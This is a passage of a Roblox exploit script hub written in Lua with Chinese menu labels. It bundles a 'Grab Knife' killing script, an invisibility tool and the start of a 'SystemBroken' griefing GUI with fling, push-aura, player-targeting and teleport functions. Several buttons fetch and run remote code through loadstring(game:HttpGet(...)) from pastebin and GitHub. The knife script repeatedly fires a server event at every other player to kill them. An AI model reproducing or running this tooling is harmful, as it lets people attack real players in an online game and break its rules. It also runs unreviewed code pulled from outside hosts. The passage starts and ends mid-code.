	local lol4 = math.random(1,#bloodcolors)
	local p = Instance.new("Part")
	prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
	p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
	p.Velocity = Vector3.new(math.random(-25,25),math.random(-25,25),math.random(-25,25))
	p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
	p.CanCollide = true
	coroutine.resume(coroutine.create(function()
		wait(3)
		p:remove()
	end))
end

h = Instance.new("HopperBin",me.Backpack)

h.Name = "Knife"

script.Parent = h


bin = h



function select(mouse)
	orr.Part1 = nil
	ar.Part1 = knife
	mouse.Button1Down:connect(function()
		if attacking == false then
			attacking = true
			lw.Part1 = larm
			rw.Part1 = rarm
			hurt = true
			for i=1, 8 do
				rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
				lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
				wait()
			end
			wait(1)
			hurt = false
			if grabbed == nil then
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
			end
		elseif hurt == false and grabbed ~= nil and mode == "drop" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
			
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "kill" and enabled2 == true then
			enabled2 = false
			enabled = false
			
			breaksound.Parent = grabbed
			breaksound:Play()
			
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.15,-0.02) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local duh = grabbed
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)				
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			wait(0.12)
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(-0.02,-0.15,0.02) * CFrame.fromEulerAnglesXYZ(0.05,-0,0.03)
				wait()
			end
			
			
			if grabbed.Parent:findFirstChild("HumanoidRootPart",true) then
                        for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
                 end
          end
			end
			grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health / 1.5
			
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "drain" and enabled == true then
				enabled = false
				enabled2 = true
				
				for i=1, 2 do
					lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
					wait()
				end	

				while char.Humanoid.Health == char.Humanoid.MaxHealth do
					bleed(grabbed, 1)
					char.Humanoid.Health = char.Humanoid.Health + 1
					grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health - 1
					wait(0.0335)
				end
				
				for i=1, 1 do
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				enabled = true
				
				
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			local bf = Instance.new("BodyForce",grabbed)
			bf.force = torso.CFrame.lookVector * 4000
			bf.force = bf.force + Vector3.new(0,1500,0)
			coroutine.resume(coroutine.create(function()
				wait(0.12)
				bf:remove()
			end))
			for i=1, 6 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
				wait()
			end
			wait(0.2)
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
		elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "para" then
			enabled2 = true
			killsound.Parent = grabbed
			killsound:Play()
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local ne = grabbed:findFirstChild("Neck")
			coroutine.resume(coroutine.create(function()
				local duh = grabbed
				local duh2 = grabbed.Parent.Head
				local lolas = lolhum
				duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
				for i=1, 75 do
					wait()
					local hm = math.random(1,15)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
							script.Parent.Splat:Play();
						end
					end)

					if hm > 0 and hm < 4 then

						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh,1)
						bleed(duh,1)										
					end
				end
				wait(1.2)
				
				lolas.Health = 0
				for i=1, 85 do
					wait()
					local hm = math.random(1,9)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
						end
					end)
					if hm > 0 and hm < 3 then
						bleed(duh,1)
						bleed(duh2,-0.5)
					end
				end
			end))
			for i=1, 3 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				if ne ~= nil then
					grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
				end
				wait()
			end
			grabweld:remove()
			grabweld = nil
			for i=1, 4 do
				lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			platlol = false
			grabbed = nil
			lolhum = nil
			attacking = false
			platlol = nil
		end
	end)
	mouse.KeyDown:connect(function(kai)
		key = kai:lower()
		if key == "q" then
			mode = "drop"
			inform("Fix Knife",1)
		elseif key == "e" then
			mode = "kill"
			inform("Kill",1)
		end
	end)
end

function desel()
	repeat wait() until attacking == false
	orr.Part1 = knife
	ar.Part1 = nil
end

bin.Selected:connect(select)
bin.Deselected:connect(desel)

char.Humanoid.Died:connect(function()
	pcall(function()
		grabweld:remove()
		grabweld = nil
		grabbed = nil
		platlol = false
		platlol = nil
	end)
end)

inform("Prison Life v2.0.2 Grab Knife Loaded | e = Kill /\ q = Fix Knife",3)
wait(3.2)
inform("Made By ASADCATONVERM :D", 2)

  	end    

})

Tab:AddButton({

	Name = "手里剑（部分游戏可攻击）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/mSLiAZHk"))()

  	end    

})

Tab:AddButton({

	Name = "装备隐身",

	Callback = function()

     local offset = 1100
local invisible = game.Players.LocalPlayer
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
            player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance
            player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance
        end
    end
end
local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Invisible"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(
    function()
        wait()
        if not invisible then
            invisible = true
            tool.Name = "Enabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            handle = Instance.new("Part", workspace)
            handle.Name = "Handle"
            handle.Transparency = 1
            handle.CanCollide = false
            handle.Size = Vector3.new(2, 1, 1)
            weld = Instance.new("Weld", handle)
            weld.Part0 = handle
            weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
            weld.C0 = CFrame.new(0, offset - 1.5, 0)
            setDisplayDistance(offset + 100)
            workspace.CurrentCamera.CameraSubject = handle
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = offset
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            for _, child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if child:IsA("Tool") and child ~= tool then
                    grips[child] = child.Grip
                end
            end
        elseif invisible then
            invisible = false
            tool.Name = "Disabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            for _, child in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if child:IsA("Tool") then
                    child.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            for tool, grip in pairs(grips) do
                if tool then
                    tool.Grip = grip
                end
            end
            heldTool = nil
            setDisplayDistance(100)
            workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
        end
        tool.Parent = game.Players.LocalPlayer.Backpack
    end
)
game.Players.LocalPlayer.Character.ChildAdded:Connect(
    function(child)
        wait()
        if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
            heldTool = child
            local lastGrip = heldTool.Grip
            if not grips[heldTool] then
                grips[heldTool] = lastGrip
            end
            for _, track in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                track:Stop()
            end
            game.Players.LocalPlayer.Character.Animate.Disabled = true
            heldTool.Grip = heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
            heldTool.Parent = game.Players.LocalPlayer.Backpack
            heldTool.Parent = game.Players.LocalPlayer.Character
            if gripChanged then
                gripChanged:Disconnect()
            end
            gripChanged =
                heldTool:GetPropertyChangedSignal("Grip"):Connect(
                function()
                    wait()
                    if not invisible then
                        gripChanged:Disconnect()
                    end
                    if heldTool.Grip ~= lastGrip then
                        lastGrip =
                            heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                        heldTool.Grip = lastGrip
                        heldTool.Parent = game.Players.LocalPlayer.Backpack
                        heldTool.Parent = game.Players.LocalPlayer.Character
                    end
                end
            )
        end
    end
)

  	end    

})

local Tab = Window:MakeTab({

    Name = "脚本功能",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "doors汉化",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XSKMS/MS-Chinese-XXZ/refs/heads/main/rename.txt"))()

  	end    

})

Tab:AddButton({

	Name = "皇冠脚本（主要功能区四）",

	Callback = function()

     --RELOAD GUI
if game.CoreGui:FindFirstChild("SysBroker") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System Broken",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
	return
end
local version = 2
--VARIABLES
_G.AntiFlingToggled = false
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Light = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local mouse = plr:GetMouse()
local ScriptWhitelist = {}
local ForceWhitelist = {}
local TargetedPlayer = nil
local FlySpeed = 50
local PotionTool = nil
local SavedCheckpoint = nil
local MinesFolder = nil
local FreeEmotesEnabled = false
local CannonsFolders = {}

pcall(function()
	MinesFolder = game:GetService("Workspace").Landmines
	for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
		if v.Name == "Cannons" then
			table.insert(CannonsFolders, v)
		end
	end
end)
--FUNCTIONS
_G.shield = function(id)
	if not table.find(ForceWhitelist,id) then
		table.insert(ForceWhitelist, id)
	end
end

local function RandomChar()
	local length = math.random(1,5)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

local function ChangeToggleColor(Button)
	led = Button.Ticket_Asset
	if led.ImageColor3 == Color3.fromRGB(255, 0, 0) then
		led.ImageColor3 = Color3.fromRGB(0, 255, 0)
	else
		led.ImageColor3 = Color3.fromRGB(255, 0, 0)
	end
end

local function GetPing()
	return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())/1000
end

local function GetPlayer(UserDisplay)
	if UserDisplay ~= "" then
        for i,v in pairs(Players:GetPlayers()) do
            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
                return v
            end
        end
		return nil
	else
		return nil
    end
end

local function GetCharacter(Player)
	if Player.Character then
		return Player.Character
	end
end

local function GetRoot(Player)
	if GetCharacter(Player):FindFirstChild("HumanoidRootPart") then
		return GetCharacter(Player).HumanoidRootPart
	end
end

local function TeleportTO(posX,posY,posZ,player,method)
	pcall(function()
		if method == "safe" then
			task.spawn(function()
				for i = 1,30 do
					task.wait()
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
					if player == "pos" then
						GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
					else
						GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
					end
				end
			end)
		else
			GetRoot(plr).Velocity = Vector3.new(0,0,0)
			if player == "pos" then
				GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
			else
				GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
			end
		end
	end)
end

local function PredictionTP(player,method)
	local root = GetRoot(player)
	local pos = root.Position
	local vel = root.Velocity
	GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	if method == "safe" then
		task.wait()
		GetRoot(plr).CFrame = CFrame.new(pos)
		task.wait()
		GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	end
end

local function Touch(x,root)
	pcall(function()
		x = x:FindFirstAncestorWhichIsA("Part")
		if x then
			if firetouchinterest then
				task.spawn(function()
					firetouchinterest(x, root, 1)
					task.wait()
					firetouchinterest(x, root, 0)
				end)
			end
		end
	end)
end


local function GetPush()
	local TempPush = nil
	pcall(function()
		if plr.Backpack:FindFirstChild("Push") then
			PushTool = plr.Backpack.Push
			PushTool.Parent = plr.Character
			TempPush = PushTool
		end
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character:FindFirstChild("Push") then
				TempPush = v.Character.Push
			end
		end
	end)
	return TempPush
end

local function CheckPotion()
	if plr.Backpack:FindFirstChild("potion") then
		PotionTool = plr.Backpack:FindFirstChild("potion")
		return true
	elseif plr.Character:FindFirstChild("potion") then
		PotionTool = plr.Character:FindFirstChild("potion")
		return true
	else
		return false
	end
end

local function Push(Target)
	local Push = GetPush()
	local FixTool = nil
	if Push ~= nil then
		local args = {[1] = Target.Character}
		GetPush().PushTool:FireServer(unpack(args))
	end
	if plr.Character:FindFirstChild("Push") then
		plr.Character.Push.Parent = plr.Backpack
	end
	if plr.Character:FindFirstChild("ModdedPush") then
		FixTool = plr.Character:FindFirstChild("ModdedPush")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("ClickTarget") then
		FixTool = plr.Character:FindFirstChild("ClickTarget")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("potion") then
		FixTool = plr.Character:FindFirstChild("potion")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
end

local function ToggleRagdoll(bool)
	pcall(function()
		plr.Character["Falling down"].Disabled = bool
		plr.Character["Swimming"].Disabled = bool
		plr.Character["StartRagdoll"].Disabled = bool
		plr.Character["Pushed"].Disabled = bool
		plr.Character["RagdollMe"].Disabled = bool
	end)
end

local function ToggleVoidProtection(bool)
	if bool then
		game.Workspace.FallenPartsDestroyHeight = 0/0
	else
		game.Workspace.FallenPartsDestroyHeight = -500
	end
end

local function PlayAnim(id,time,speed)
	pcall(function()
		plr.Character.Animate.Disabled = false
		local hum = plr.Character.Humanoid
		local animtrack = hum:GetPlayingAnimationTracks()
		for i,track in pairs(animtrack) do
			track:Stop()
		end
		plr.Character.Animate.Disabled = true
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..id
		local loadanim = hum:LoadAnimation(Anim)
		loadanim:Play()
		loadanim.TimePosition = time
		loadanim:AdjustSpeed(speed)
		loadanim.Stopped:Connect(function()
			plr.Character.Animate.Disabled = false
			for i, track in pairs (animtrack) do
        		track:Stop()
    		end
		end)
	end)
end

local function StopAnim()
	plr.Character.Animate.Disabled = false
    local animtrack = plr.Character.Humanoid:GetPlayingAnimationTracks()
    for i, track in pairs (animtrack) do
        track:Stop()
    end
end

local function SendNotify(title, message, duration)
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = title,Text = message,Duration = duration;})
end

--LOAD GUI
task.wait(0.1)
local SysBroker = Instance.new("ScreenGui")
local Background = Instance.new("ImageLabel")
local TitleBarLabel = Instance.new("TextLabel")
local SectionList = Instance.new("Frame")
local Home_Section_Button = Instance.new("TextButton")
local Game_Section_Button = Instance.new("TextButton")
local Character_Section_Button = Instance.new("TextButton")
local Target_Section_Button = Instance.new("TextButton")
local Animations_Section_Button = Instance.new("TextButton")
local Misc_Section_Button = Instance.new("TextButton")
local Credits_Section_Button = Instance.new("TextButton")
local Game_Section = Instance.new("ScrollingFrame")
local AntiRagdoll_Button = Instance.new("TextButton")
local PotionFling_Button = Instance.new("TextButton")
local SpamMines_Button = Instance.new("TextButton")
local PushAura_Button = Instance.new("TextButton")
local BreakCannons_Button = Instance.new("TextButton")
local LethalCannons_Button = Instance.new("TextButton")
local ChatAlert_Button = Instance.new("TextButton")
local PotionDi_Button = Instance.new("TextButton")
local VoidProtection_Button = Instance.new("TextButton")
local PushAll_Button = Instance.new("TextButton")
local TouchFling_Button = Instance.new("TextButton")
local CMDBar = Instance.new("TextBox")
local CannonTP1_Button = Instance.new("TextButton")
local CannonTP2_Button = Instance.new("TextButton")
local CannonTP3_Button = Instance.new("TextButton")
local MinefieldTP_Button = Instance.new("TextButton")
local BallonTP_Button = Instance.new("TextButton")
local NormalStairsTP_Button = Instance.new("TextButton")
local MovingStairsTP_Button = Instance.new("TextButton")
local SpiralStairsTP_Button = Instance.new("TextButton")
local SkyscraperTP_Button = Instance.new("TextButton")
local PoolTP_Button = Instance.new("TextButton")
local FreePushTool_Button = Instance.new("TextButton")
local Home_Section = Instance.new("ScrollingFrame")
local Profile_Image = Instance.new("ImageLabel")
local Welcome_Label = Instance.new("TextLabel")
local Announce_Label = Instance.new("TextLabel")
local Character_Section = Instance.new("ScrollingFrame")
local WalkSpeed_Button = Instance.new("TextButton")
local WalkSpeed_Input = Instance.new("TextBox")
local ClearCheckpoint_Button = Instance.new("TextButton")
local JumpPower_Input = Instance.new("TextBox")
local JumpPower_Button = Instance.new("TextButton")
local SaveCheckpoint_Button = Instance.new("TextButton")
local Respawn_Button = Instance.new("TextButton")
local FlySpeed_Button = Instance.new("TextButton")
local FlySpeed_Input = Instance.new("TextBox")
local Fly_Button = Instance.new("TextButton")
local Target_Section = Instance.new("ScrollingFrame")
local TargetImage = Instance.new("ImageLabel")
local ClickTargetTool_Button = Instance.new("ImageButton")
local TargetName_Input = Instance.new("TextBox")
local UserIDTargetLabel = Instance.new("TextLabel")
local ViewTarget_Button = Instance.new("TextButton")
local FlingTarget_Button = Instance.new("TextButton")
local FocusTarget_Button = Instance.new("TextButton")
local BenxTarget_Button = Instance.new("TextButton")
local PushTarget_Button = Instance.new("TextButton")
local WhitelistTarget_Button = Instance.new("TextButton")
local TeleportTarget_Button = Instance.new("TextButton")
local HeadsitTarget_Button = Instance.new("TextButton")
local StandTarget_Button = Instance.new("TextButton")
local BackpackTarget_Button = Instance.new("TextButton")
local DoggyTarget_Button = Instance.new("TextButton")
local DragTarget_Button = Instance.new("TextButton")
local Animations_Section = Instance.new("ScrollingFrame")
local VampireAnim_Button = Instance.new("TextButton")
local HeroAnim_Button = Instance.new("TextButton")
local ZombieClassicAnim_Button = Instance.new("TextButton")
local MageAnim_Button = Instance.new("TextButton")
local GhostAnim_Button = Instance.new("TextButton")
local ElderAnim_Button = Instance.new("TextButton")
local LevitationAnim_Button = Instance.new("TextButton")
local AstronautAnim_Button = Instance.new("TextButton")
local NinjaAnim_Button = Instance.new("TextButton")
local WerewolfAnim_Button = Instance.new("TextButton")
local CartoonAnim_Button = Instance.new("TextButton")
local PirateAnim_Button = Instance.new("TextButton")
local SneakyAnim_Button = Instance.new("TextButton")
local ToyAnim_Button = Instance.new("TextButton")
local KnightAnim_Button = Instance.new("TextButton")
--NEWS
local ConfidentAnim_Button = Instance.new("TextButton")
local PopstarAnim_Button = Instance.new("TextButton")
local PrincessAnim_Button = Instance.new("TextButton")
local CowboyAnim_Button = Instance.new("TextButton")
local PatrolAnim_Button = Instance.new("TextButton")
local ZombieFEAnim_Button = Instance.new("TextButton")
--NEWS
local Misc_Section = Instance.new("ScrollingFrame")
local AntiFling_Button = Instance.new("TextButton")
local AntiChatSpy_Button = Instance.new("TextButton")
local AntiAFK_Button = Instance.new("TextButton")
local Shaders_Button = Instance.new("TextButton")
local Day_Button = Instance.new("TextButton")
local Night_Button = Instance.new("TextButton")
local Rejoin_Button = Instance.new("TextButton")
local CMDX_Button = Instance.new("TextButton")
local InfYield_Button = Instance.new("TextButton")
local Serverhop_Button = Instance.new("TextButton")
local Explode_Button = Instance.new("TextButton")
local FreeEmotes_Button = Instance.new("TextButton")
local ChatBox_Input = Instance.new("TextBox")
local Credits_Section = Instance.new("ScrollingFrame")
local Credits_Label = Instance.new("TextLabel")
local Crown = Instance.new("ImageLabel")
local Assets = Instance.new("Folder")
local Ticket_Asset = Instance.new("ImageButton")
local Click_Asset = Instance.new("ImageButton")
local Velocity_Asset = Instance.new("BodyAngularVelocity")
local Fly_Pad = Instance.new("ImageButton")
local UIGradient = Instance.new("UIGradient")
local FlyAButton = Instance.new("TextButton")
local FlyDButton = Instance.new("TextButton")
local FlyWButton = Instance.new("TextButton")
local FlySButton = Instance.new("TextButton")
local OpenClose = Instance.new("ImageButton")
local UICornerOC = Instance.new("UICorner")

local function CreateToggle(Button)
	local NewToggle = Ticket_Asset:Clone()
	NewToggle.Parent = Button
end

local function CreateClicker(Button)
	local NewClicker = Click_Asset:Clone()
	NewClicker.Parent = Button
end

SysBroker.Name = "SysBroker"
SysBroker.Parent = game.CoreGui
SysBroker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Background.Name = "Background"
Background.Parent = SysBroker
Background.AnchorPoint = Vector2.new(0.5, 0.5)
Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Background.BorderColor3 = Color3.fromRGB(0, 255, 255)
Background.Position = UDim2.new(0.5, 0, 0.5, 0)
Background.Size = UDim2.new(0, 500, 0, 350)
Background.ZIndex = 9
Background.Image = "rbxassetid://159991693"
Background.ImageColor3 = Color3.fromRGB(0, 255, 255)
Background.ImageTransparency = 0.600
Background.ScaleType = Enum.ScaleType.Tile
Background.SliceCenter = Rect.new(0, 256, 0, 256)
Background.TileSize = UDim2.new(0, 30, 0, 30)
Background.Active = true
Background.Draggable = true

TitleBarLabel.Name = "TitleBarLabel"
TitleBarLabel.Parent = Background
TitleBarLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BackgroundTransparency = 0.250
TitleBarLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BorderSizePixel = 0
TitleBarLabel.Size = UDim2.new(1, 0, 0, 30)
TitleBarLabel.Font = Enum.Font.Unknown
TitleBarLabel.Text = "____/SYSTEMBROKEN\\___"
TitleBarLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
TitleBarLabel.TextScaled = true
TitleBarLabel.TextSize = 14.000
TitleBarLabel.TextWrapped = true
TitleBarLabel.TextXAlignment = Enum.TextXAlignment.Left

SectionList.Name = "SectionList"
SectionList.Parent = Background
SectionList.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BackgroundTransparency = 0.500
SectionList.BorderColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BorderSizePixel = 0
SectionList.Position = UDim2.new(0, 0, 0, 30)
SectionList.Size = UDim2.new(0, 105, 0, 320)

Home_Section_Button.Name = "Home_Section_Button"
Home_Section_Button.Parent = SectionList
Home_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Home_Section_Button.BackgroundTransparency = 0.500
Home_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.BorderSizePixel = 0
Home_Section_Button.Position = UDim2.new(0, 0, 0, 25)
Home_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Home_Section_Button.Font = Enum.Font.Oswald
Home_Section_Button.Text = "Home"
Home_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.TextScaled = true
Home_Section_Button.TextSize = 14.000
Home_Section_Button.TextWrapped = true

Game_Section_Button.Name = "Game_Section_Button"
Game_Section_Button.Parent = SectionList
Game_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Game_Section_Button.BackgroundTransparency = 0.500
Game_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.BorderSizePixel = 0
Game_Section_Button.Position = UDim2.new(0, 0, 0, 65)
Game_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Game_Section_Button.Font = Enum.Font.Oswald
Game_Section_Button.Text = "Game"
Game_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.TextScaled = true
Game_Section_Button.TextSize = 14.000
Game_Section_Button.TextWrapped = true

Character_Section_Button.Name = "Character_Section_Button"
Character_Section_Button.Parent = SectionList
Character_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Character_Section_Button.BackgroundTransparency = 0.500
Character_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.BorderSizePixel = 0
Character_Section_Button.Position = UDim2.new(0, 0, 0, 105)
Character_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Character_Section_Button.Font = Enum.Font.Oswald
Character_Section_Button.Text = "Character"
Character_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.TextScaled = true
Character_Section_Button.TextSize = 14.000
Character_Section_Button.TextWrapped = true

Target_Section_Button.Name = "Target_Section_Button"
Target_Section_Button.Parent = SectionList
Target_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Target_Section_Button.BackgroundTransparency = 0.500
Target_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.BorderSizePixel = 0
Target_Section_Button.Position = UDim2.new(0, 0, 0, 145)
Target_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Target_Section_Button.Font = Enum.Font.Oswald
Target_Section_Button.Text = "Target"
Target_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.TextScaled = true
Target_Section_Button.TextSize = 14.000
Target_Section_Button.TextWrapped = true

Animations_Section_Button.Name = "Animations_Section_Button"
Animations_Section_Button.Parent = SectionList
